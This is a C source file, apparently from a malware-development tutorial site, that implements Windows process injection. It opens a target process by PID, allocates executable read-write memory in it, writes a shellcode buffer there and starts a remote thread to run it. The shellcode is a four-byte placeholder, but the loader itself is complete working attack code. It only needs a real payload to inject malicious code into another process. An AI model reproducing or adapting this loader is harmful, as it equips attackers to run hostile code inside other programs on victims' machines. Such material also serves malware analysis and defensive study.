/*------------------------------------------------------------------------------------------------------
@author     crow
@brief      inject shellcode into the target process and create a thread to execute the payload
@site       https://www.crow.rip/crows-nest/mal/dev/inject/shellcode-injection
------------------------------------------------------------------------------------------------------*/

#include <windows.h>
#include <stdio.h>

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)

int main(int argc, char* argv[]) {
	
	DWORD  dwPID     = 0;
	PVOID  rBuffer   = NULL;
	HANDLE hProcess  = NULL;
	HANDLE hThread   = NULL;
	
	const UCHAR shellcode[] = { 0xDE, 0xAD, 0xBE, 0xEF };
	SIZE_T szShellcode = sizeof(shellcode);

	if (argc < 2) {
		warn("usage: %s <PID>", argv[0]);
		return EXIT_FAILURE;
	}

	dwPID = atoi(argv[1]);
	
	info("trying to get a handle on the process (%ld)...", dwPID);
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
	if (hProcess == NULL) {
		warn("[OpenProcess] failed, error: 0x%lx", GetLastError());
		return EXIT_FAILURE;
	}
	info("\\___[ hProcess\n\t\\_0x%p]\n", hProcess);
	
	info("allocating [RWX] buffer in process memory...");
	rBuffer = VirtualAllocEx(hProcess, NULL, szShellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (rBuffer == NULL) {
		warn("[VirtualAllocEx] failed, error: 0x%lx", GetLastError());
		goto CLEANUP;
	}
	okay("allocated [RWX] buffer in process memory at 0x%p", rBuffer);

	info("writing to allocated buffer...");
	WriteProcessMemory(hProcess, rBuffer, shellcode, szShellcode, 0);
	
	info("creating thread to run shellcode...");
	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, 0);
	if (hThread == NULL) {
		warn("[CreateRemoteThread] failed, error: 0x%lx", GetLastError());
		goto CLEANUP;
	}
	okay("thread created!");

	info("waiting for thread to finish exection");
	WaitForSingleObject(hThread, INFINITE);
	okay("thread finished execution!");
	info("exiting...");

CLEANUP:

	if (hProcess) {
		info("closing handle to process");
		CloseHandle(hProcess);
	}

	if (hThread) {
		info("closing handle to thread");
		CloseHandle(hThread);
	}

	okay("finished cleanup! see ya :>");
	return EXIT_SUCCESS;

}

